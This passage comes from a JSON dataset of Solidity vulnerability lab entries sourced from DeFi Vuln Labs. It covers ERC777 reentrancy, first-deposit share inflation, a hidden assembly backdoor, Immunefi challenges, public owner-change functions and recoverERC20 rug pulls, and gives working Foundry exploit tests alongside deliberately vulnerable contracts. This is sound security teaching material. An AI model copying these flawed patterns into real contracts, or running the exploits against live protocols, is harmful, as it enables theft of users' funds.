15290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029\"\n            )\n        );\n        MyERC777TokenContract = new MyERC777(0);\n    }\n\n    function testERC777Reentrancy() public {\n        // Register IERC1820Registry\n        IERC1820Registry registry = IERC1820Registry(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)\n        );\n        // tokensReceived Hook\n        // The token contract MUST call the tokensReceived hook of the recipient if the recipient registers an ERC777TokensRecipient implementation via ERC-1820.\n        registry.setInterfaceImplementer(\n            address(this),\n            _TOKENS_RECIPIENT_INTERFACE_HASH,\n            address(this)\n        );\n        //set up env\n        SimpleBankContract = new SimpleBank(address(MyERC777TokenContract));\n        MyERC777TokenContract.mint(address(SimpleBankContract), 10000, \"\", \"\");\n\n        console.log(\n            \"Maximum claims is 1,000 for each EOA, How can you bypass this limitation?\"\n        );\n        console.log(\n            \"Before exploiting, My GLD Balance :\",\n            MyERC777TokenContract.balanceOf(address(this))\n        );\n        SimpleBankContract.claim(address(this), 900); // claim token to trigger callback function `tokensReceived()`.\n        // Expect 900 (the claim amount), but we will get the 1,900 due to reenter to claim 1,000.\n        console.log(\n            \"After exploiting, My GLD Balance :\",\n            MyERC777TokenContract.balanceOf(address(this))\n        );\n    }\n\n    function tokensReceived(\n        address payable operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata data,\n        bytes calldata operatorData\n    ) external {\n        if (MyERC777TokenContract.balanceOf(address(this)) <= 1000) {\n            console.log(\"Reentered\");\n            // exploit here, claim 1,000 tokens.\n            SimpleBank(operator).claim(address(this), 1000);\n        }\n    }\n\n    receive() external payable {}\n}\n\ncontract MyERC777 is ERC777 {\n    constructor(\n        uint256 initialSupply\n    ) ERC777(\"Gold\", \"GLD\", new address[](0)) {}\n    function mint(\n        address account,\n        uint256 amount,\n        bytes memory userData,\n        bytes memory operatorData\n    ) public returns (bool) {\n        _mint(account, amount, userData, operatorData);\n        return true;\n    }\n}\n\ncontract SimpleBank is Test {\n    ERC777 private token;\n    uint maxMintsPerAddress = 1000;\n    mapping(address => uint256) public _mints;\n    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =\n        keccak256(\"ERC777TokensRecipient\");\n\n    function setUp() external {\n        // mock ERC1820Registry contract in foundry\n        vm.etch(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),\n            bytes(\n                hex\"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029\"\n            )\n        );\n    }\n    constructor(address nftAddress) {\n        token = ERC777(nftAddress);\n\n        // Register IERC1820Registry\n        IERC1820Registry registry = IERC1820Registry(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)\n        );\n        registry.setInterfaceImplementer(\n            address(this),\n            _TOKENS_RECIPIENT_INTERFACE_HASH,\n            address(this)\n        );\n    }\n\n    function claim(address account, uint256 amount) public returns (bool) {\n        // Check if total claims for the address would exceed max mints per address.\n        require(\n            _mints[account] + amount <= maxMintsPerAddress,\n            \"Exceeds max mints per address\"\n        );\n\n        token.transfer(account, amount);\n        _mints[account] += amount; // Do not follow check-effect-interaction\n\n        return true;\n    }\n\n    function tokensReceived(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata data,\n        bytes calldata operatorData\n    ) external {}\n    receive() external payable {}\n}\n",
    "severity": "Medium",
    "category": "Reentrancy",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/ERC777-reentrancy.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "first-deposit",
    "slug": "first-deposit",
    "title": "First deposit bug",
    "description": "First pool depositor can be front-run and have part of their deposit stolen\nIn this case, we can control the variable \"_supplied.\" \nBy depositing a small amount of loan tokens to obtain pool tokens, \nwe can front-run other depositors' transactions and inflate the price of pool tokens through a substantial \"donation.\"\nConsequently, the attacker can withdraw a greater quantity of loan tokens than they initially possessed.\n\nThis calculation issue arises because, in Solidity, if the pool token value for a user becomes less than 1,\nit is essentially rounded down to 0.",
    "mitigation": "Consider minting a minimal amount of pool tokens during the first deposit \nand sending them to zero address, this increases the cost of the attack. \nUniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. \nThe same can be done in this case i.e. when totalSupply() == 0, \nsend the first min liquidity LP tokens to the zero address to enable share dilution.\n\nREF:\nhttps://defihacklabs.substack.com/p/solidity-security-lesson-2-first\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/1\nhttps://github.com/transmissions11/solmate/issues/178",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\n\nName: First deposit bug\n\nDescription:\nFirst pool depositor can be front-run and have part of their deposit stolen\nIn this case, we can control the variable \"_supplied.\" \nBy depositing a small amount of loan tokens to obtain pool tokens, \nwe can front-run other depositors' transactions and inflate the price of pool tokens through a substantial \"donation.\"\nConsequently, the attacker can withdraw a greater quantity of loan tokens than they initially possessed.\n\nThis calculation issue arises because, in Solidity, if the pool token value for a user becomes less than 1,\nit is essentially rounded down to 0.\n\nMitigation:  \nConsider minting a minimal amount of pool tokens during the first deposit \nand sending them to zero address, this increases the cost of the attack. \nUniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. \nThe same can be done in this case i.e. when totalSupply() == 0, \nsend the first min liquidity LP tokens to the zero address to enable share dilution.\n\nREF:\nhttps://defihacklabs.substack.com/p/solidity-security-lesson-2-first\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/1\nhttps://github.com/transmissions11/solmate/issues/178\n*/\n\ncontract ContractTest is Test {\n    SimplePool SimplePoolContract;\n    MyToken MyTokenContract;\n\n    function setUp() public {\n        MyTokenContract = new MyToken();\n        SimplePoolContract = new SimplePool(address(MyTokenContract));\n    }\n\n    function testFirstDeposit() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        MyTokenContract.transfer(alice, 1 ether + 1);\n        MyTokenContract.transfer(bob, 2 ether);\n\n        vm.startPrank(alice);\n        // Alice deposits 1 wei, gets 1 pool token\n        MyTokenContract.approve(address(SimplePoolContract), 1);\n        SimplePoolContract.deposit(1);\n\n        // Alice transfers 1 ether to the pool, inflating the pool token price\n        MyTokenContract.transfer(address(SimplePoolContract), 1 ether);\n\n        vm.stopPrank();\n        vm.startPrank(bob);\n        // Bob deposits 2 ether, gets 1 pool token due to inflated price\n        // uint shares = _tokenAmount * _sharesTotalSupply / _supplied;\n        // shares = 2000000000000000000 * 1 / 1000000000000000001 = 1.9999999999999999999 => round down to 1.\n        MyTokenContract.approve(address(SimplePoolContract), 2 ether);\n        SimplePoolContract.deposit(2 ether);\n        vm.stopPrank();\n        vm.startPrank(alice);\n\n        MyTokenContract.balanceOf(address(SimplePoolContract));\n\n        // Alice withdraws and gets 1.5 ether, making a profit\n        SimplePoolContract.withdraw(1);\n        assertEq(MyTokenContract.balanceOf(alice), 1.5 ether);\n        console.log(\"Alice balance\", MyTokenContract.balanceOf(alice));\n    }\n\n    receive() external payable {}\n}\n\ncontract MyToken is ERC20, Ownable {\n    constructor() ERC20(\"MyToken\", \"MTK\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract SimplePool {\n    IERC20 public loanToken;\n    uint public totalShares;\n\n    mapping(address => uint) public balanceOf;\n\n    constructor(address _loanToken) {\n        loanToken = IERC20(_loanToken);\n    }\n\n    function deposit(uint amount) external {\n        require(amount > 0, \"Amount must be greater than zero\");\n\n        uint _shares;\n        if (totalShares == 0) {\n            _shares = amount;\n        } else {\n            _shares = tokenToShares(\n                amount,\n                loanToken.balanceOf(address(this)),\n                totalShares,\n                false\n            );\n        }\n\n        require(\n            loanToken.transferFrom(msg.sender, address(this), amount),\n            \"TransferFrom failed\"\n        );\n        balanceOf[msg.sender] += _shares;\n        totalShares += _shares;\n    }\n\n    function tokenToShares(\n        uint _tokenAmount,\n        uint _supplied,\n        uint _sharesTotalSupply,\n        bool roundUpCheck\n    ) internal pure returns (uint) {\n        if (_supplied == 0) return _tokenAmount;\n        uint shares = (_tokenAmount * _sharesTotalSupply) / _supplied;\n        if (\n            roundUpCheck &&\n            shares * _supplied < _tokenAmount * _sharesTotalSupply\n        ) shares++;\n        return shares;\n    }\n\n    function withdraw(uint shares) external {\n        require(shares > 0, \"Shares must be greater than zero\");\n        require(balanceOf[msg.sender] >= shares, \"Insufficient balance\");\n\n        uint tokenAmount = (shares * loanToken.balanceOf(address(this))) /\n            totalShares;\n\n        balanceOf[msg.sender] -= shares;\n        totalShares -= shares;\n\n        require(loanToken.transfer(msg.sender, tokenAmount), \"Transfer failed\");\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/first-deposit.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "backdoor-assembly",
    "slug": "backdoor-assembly",
    "title": "Hidden Backdoor in Contract:",
    "description": "In this contract, an apparently fair 'LotteryGame' contract is subtly designed to allow \na hidden privilege to the contract deployer/administrator. \nThis is achieved through the use of assembly level access to storage variables, \nwhere a referee function is designed to provide an administrative backdoor. \nThe 'pickWinner' function appears to randomly pick a winner, but in reality,\nit allows the administrator to set the winner. \nThis bypasses the usual access controls and can be used to drain the prize pool \nby an unauthorized user, acting as a type of rug pull.\n\nAn attacker can manipulate smart contracts as a backdoor by writing inline assembly. \nAny sensitive parameters can be changed at any time.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/* \nName: Hidden Backdoor in Contract:\n\nDescription:\nIn this contract, an apparently fair 'LotteryGame' contract is subtly designed to allow \na hidden privilege to the contract deployer/administrator. \nThis is achieved through the use of assembly level access to storage variables, \nwhere a referee function is designed to provide an administrative backdoor. \nThe 'pickWinner' function appears to randomly pick a winner, but in reality,\nit allows the administrator to set the winner. \nThis bypasses the usual access controls and can be used to drain the prize pool \nby an unauthorized user, acting as a type of rug pull.\n\nAn attacker can manipulate smart contracts as a backdoor by writing inline assembly. \nAny sensitive parameters can be changed at any time.\n\nScenario:\nLottery game: anyone can call pickWinner to get prize if you are lucky. \nRefers to JST contract backdoor. many rugged style's contract has similar pattern.\nLooks like theres is no setwinner function in contract, how admin can rug?\n*/\n\ncontract ContractTest is Test {\n    LotteryGame LotteryGameContract;\n\n    function testBackdoorCall() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        LotteryGameContract = new LotteryGame();\n        console.log(\n            \"Alice performs pickWinner, of course she will not be a winner\"\n        );\n        vm.prank(alice);\n        LotteryGameContract.pickWinner(address(alice));\n        console.log(\"Prize: \", LotteryGameContract.prize());\n\n        console.log(\"Now, admin sets the winner to drain out the prize.\");\n        LotteryGameContract.pickWinner(address(bob));\n        console.log(\"Admin manipulated winner: \", LotteryGameContract.winner());\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract LotteryGame {\n    uint256 public prize = 1000;\n    address public winner;\n    address public admin = msg.sender;\n\n    modifier safeCheck() {\n        if (msg.sender == referee()) {\n            _;\n        } else {\n            getkWinner();\n        }\n    }\n\n    function referee() internal view returns (address user) {\n        assembly {\n            // load admin value at slot 2 of storage\n            user := sload(2)\n        }\n    }\n\n    function pickWinner(address random) public safeCheck {\n        assembly {\n            // admin backddoor which can set winner address\n            sstore(1, random)\n        }\n    }\n\n    function getkWinner() public view returns (address) {\n        console.log(\"Current winner: \", winner);\n        return winner;\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Backdoor-assembly.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "immunefi-ch1",
    "slug": "immunefi-ch1",
    "title": "Immunefi_ch1",
    "description": "No description provided.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\n\n// Immunefi #spotthebugchallenge!\n// https://twitter.com/immunefi/status/1557301712549023745\n\ncontract ContractTest is Test {\n    HerToken HerTokenContract;\n\n    function testSafeMint() public {\n        HerTokenContract = new HerToken();\n\n        HerTokenContract.safeMint{value: 1 ether}(address(this), 10);\n        console.log(\n            \"Due to incorrect check msg.value, we can mint many NFTs with 1 Eth.\"\n        );\n        console.log(\"NFT minted:\", HerTokenContract.balanceOf(address(this)));\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public returns (bytes4) {\n        //   HerTokenContract.safeMint{value: 1 ether}(address(this),30);\n        return this.onERC721Received.selector;\n    }\n\n    receive() external payable {}\n}\n\ncontract HerToken is ERC721, Ownable, Test {\n    uint128 constant MINT_PRICE = 1 ether;\n    uint128 constant MAX_SUPPLY = 10000;\n    uint mintIndex;\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIdCounter;\n\n    constructor() payable ERC721(\"HarToken\", \"HRT\") {}\n\n    function safeMint(address to, uint256 amount) public payable {\n        require(\n            _tokenIdCounter.current() + amount < MAX_SUPPLY,\n            \"Cannot mint given amount.\"\n        );\n        require(amount > 0, \"Must give a mint amount.\");\n        //fix require(msg.value >= MINT_PRICE * amount, \"Insufficient Ether.\");\n        // before the loop\n        for (uint256 i = 0; i < amount; i++) {\n            require(msg.value >= MINT_PRICE, \"Insufficient Ether.\");\n\n            mintIndex = _tokenIdCounter.current();\n            console.log(\"mintIndex\", mintIndex);\n            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.\n            _tokenIdCounter.increment();\n        }\n    }\n}\n",
    "severity": "Medium",
    "category": "Reentrancy",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Immunefi_ch1.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "immunefi-ch2",
    "slug": "immunefi-ch2",
    "title": "Immunefi_ch2",
    "description": "No description provided.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/utils/StorageSlot.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\n//#SpotTheBugChallenge\n//https://twitter.com/immunefi/status/1562858386244665348?s=21&t=d7_HtNra5AGuNmzVtv9uKg\ninterface imp {\n    function initialize(address) external;\n}\n\ncontract ContractTest is Test {\n    Proxy ProxyContract;\n    Implementation ImplementationContract;\n\n    function testChallenge() public {\n        ImplementationContract = new Implementation();\n        console.log(\n            \"ImplementationContract addr\",\n            address(ImplementationContract)\n        );\n        ProxyContract = new Proxy(address(ImplementationContract));\n\n        emit log_named_bytes32(\n            \"Storage slot 0:\",\n            vm.load(address(ProxyContract), bytes32(uint256(0)))\n        );\n    }\n}\n\ncontract Proxy {\n    //bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\");  //correct pattern.\n    bytes32 internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\"); // wrong\n\n    constructor(address implementation) {\n        _setImplementation(address(0));\n        Address.functionDelegateCall(\n            implementation,\n            abi.encodeWithSignature(\"initialize(address)\", msg.sender)\n        );\n    }\n\n    fallback() external payable {\n        address implementation = _getImplementation();\n        Address.functionDelegateCall(implementation, msg.data);\n    }\n\n    function _setImplementation(address newImplementation) private {\n        //require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        StorageSlot\n            .getAddressSlot(_IMPLEMENTATION_SLOT)\n            .value = newImplementation;\n    }\n\n    function _getImplementation() public view returns (address) {\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n    }\n}\n\ncontract Implementation is Ownable, Initializable {\n    // function initialize(address owner) external {    //test purpose\n    function initialize(address owner) external initializer {\n        _transferOwnership(owner);\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Immunefi_ch2.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "visibility",
    "slug": "visibility",
    "title": "Improper Access Control Vulnerability",
    "description": "The default visibility of the function is Public. \nIf there is an unsafe visibility setting, the attacker can directly call the sensitive function in the smart contract.\n\nThe ownerGame contract has a changeOwner function that is intended to change the owner of the contract.\nHowever, due to improper access control, this function is publicly accessible and \ncan be called by any external account or contract. As a result, an attacker can call this function\nto change the ownership of the contract and take control.\n\nImpact: the owner of the contract can be changed by anyone.",
    "mitigation": "Use access control modifiers: Solidity provides modifiers, such as onlyOwner, \nwhich can be used to restrict the access of functions",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\nimport \"forge-std/Test.sol\";\n\n/*\nName: Improper Access Control Vulnerability\n\nDescription:\nThe default visibility of the function is Public. \nIf there is an unsafe visibility setting, the attacker can directly call the sensitive function in the smart contract.\n\nThe ownerGame contract has a changeOwner function that is intended to change the owner of the contract.\nHowever, due to improper access control, this function is publicly accessible and \ncan be called by any external account or contract. As a result, an attacker can call this function\nto change the ownership of the contract and take control.\n\nImpact: the owner of the contract can be changed by anyone.\n\nMitigation:\nUse access control modifiers: Solidity provides modifiers, such as onlyOwner, \nwhich can be used to restrict the access of functions\n \n*/\n\ncontract ContractTest is Test {\n    ownerGame ownerGameContract;\n\n    function testVisibility() public {\n        ownerGameContract = new ownerGame();\n        console.log(\n            \"Before exploiting, owner of ownerGame:\",\n            ownerGameContract.owner()\n        );\n        ownerGameContract.changeOwner(msg.sender);\n        console.log(\n            \"After exploiting, owner of ownerGame:\",\n            ownerGameContract.owner()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract ownerGame {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    // wrong visibility of changeOwner function should be onlyOwner\n    function changeOwner(address _new) public {\n        owner = _new;\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Visibility.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "recover-erc20",
    "slug": "recover-erc20",
    "title": "Incorrect implementation of the recoverERC20() function in the StakingRewards",
    "description": "The recoverERC20() function in StakingRewards.sol can potentially serve as a backdoor for the owner to retrieve rewardsToken.\nThere is no corresponding check against the rewardsToken. This creates an administrative privilege where the owner can sweep the rewards tokens, potentially using it as a means to exploit depositors.\nIt's similar to a forked issue if you forked vulnerable code.",
    "mitigation": "disallowing recovery of the rewardToken within the recoverErc20 function\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1680806251482189824\nhttps://github.com/code-423n4/2022-02-concur-findings/issues/210\nhttps://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49\nhttps://github.com/code-423n4/2022-10-paladin-findings/issues/40\nhttps://blog.openzeppelin.com/across-token-and-token-distributor-audit#anyone-can-prevent-stakers-from-getting-their-rewards",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Incorrect implementation of the recoverERC20() function in the StakingRewards\n\nDescription:\nThe recoverERC20() function in StakingRewards.sol can potentially serve as a backdoor for the owner to retrieve rewardsToken.\nThere is no corresponding check against the rewardsToken. This creates an administrative privilege where the owner can sweep the rewards tokens, potentially using it as a means to exploit depositors.\nIt's similar to a forked issue if you forked vulnerable code.\n \nMitigation:  \ndisallowing recovery of the rewardToken within the recoverErc20 function\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1680806251482189824\nhttps://github.com/code-423n4/2022-02-concur-findings/issues/210\nhttps://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49\nhttps://github.com/code-423n4/2022-10-paladin-findings/issues/40\nhttps://blog.openzeppelin.com/across-token-and-token-distributor-audit#anyone-can-prevent-stakers-from-getting-their-rewards\n*/\n\ncontract ContractTest is Test {\n    RewardToken RewardTokenContract;\n    VulnStakingRewards VulnStakingRewardsContract;\n    FixedtakingRewards FixedtakingRewardsContract;\n    address alice = vm.addr(1);\n\n    function setUp() public {\n        RewardTokenContract = new RewardToken();\n        VulnStakingRewardsContract = new VulnStakingRewards(\n            address(RewardTokenContract)\n        );\n        RewardTokenContract.transfer(address(alice), 10000 ether);\n        FixedtakingRewardsContract = new FixedtakingRewards(\n            address(RewardTokenContract)\n        );\n        //RewardTokenContract.transfer(address(alice),10000 ether);\n    }\n\n    function testVulnStakingRewards() public {\n        console.log(\n            \"Before rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n        vm.prank(alice);\n        //If alice transfer reward token to VulnStakingRewardsContract\n        RewardTokenContract.transfer(\n            address(VulnStakingRewardsContract),\n            10000 ether\n        );\n        //admin can rug reward token over recoverERC20()\n        VulnStakingRewardsContract.recoverERC20(\n            address(RewardTokenContract),\n            1000 ether\n        );\n        console.log(\n            \"After rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n    }\n\n    function testFixedStakingRewards() public {\n        console.log(\n            \"Before rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n        vm.prank(alice);\n        //If alice transfer reward token to VulnStakingRewardsContract\n        RewardTokenContract.transfer(\n            address(FixedtakingRewardsContract),\n            10000 ether\n        );\n        FixedtakingRewardsContract.recoverERC20(\n            address(RewardTokenContract),\n            1000 ether\n        );\n        console.log(\n            \"After rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract VulnStakingRewards {\n    using SafeERC20 for IERC20;\n\n    IERC20 public rewardsToken;\n    address public owner;\n\n    event Recovered(address token, uint256 amount);\n\n    constructor(address _rewardsToken) {\n        rewardsToken = IERC20(_rewardsToken);\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function recoverERC20(\n        address tokenAddress,\n        uint256 tokenAmount\n    ) public onlyOwner {\n        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n        emit Recovered(tokenAddress, tokenAmount);\n    }\n}\n\ncontract FixedtakingRewards {\n    using SafeERC20 for IERC20;\n\n    IERC20 public rewardsToken;\n    address public owner;\n\n    event Recovered(address token, uint256 amount);\n\n    constructor(address _rewardsToken) {\n        rewardsToken = IERC20(_rewardsToken);\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function recoverERC20(\n        address tokenAddress,\n        uint256 tokenAmount\n    ) external onlyOwner {\n        require(\n            tokenAddress != address(rewardsToken),\n            \"Cannot withdraw the rewardsToken\"\n        );\n        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n        emit Recovered(tokenAddress, tokenAmount);\n    }\n}\n\ncontract RewardToken is ERC20, Ownable {\n    constructor() ERC20(\"Rewardoken\", \"Reward\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/recoverERC20.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "incorrect-sanity-checks",
    "slug": "incorrect-sanity-checks",
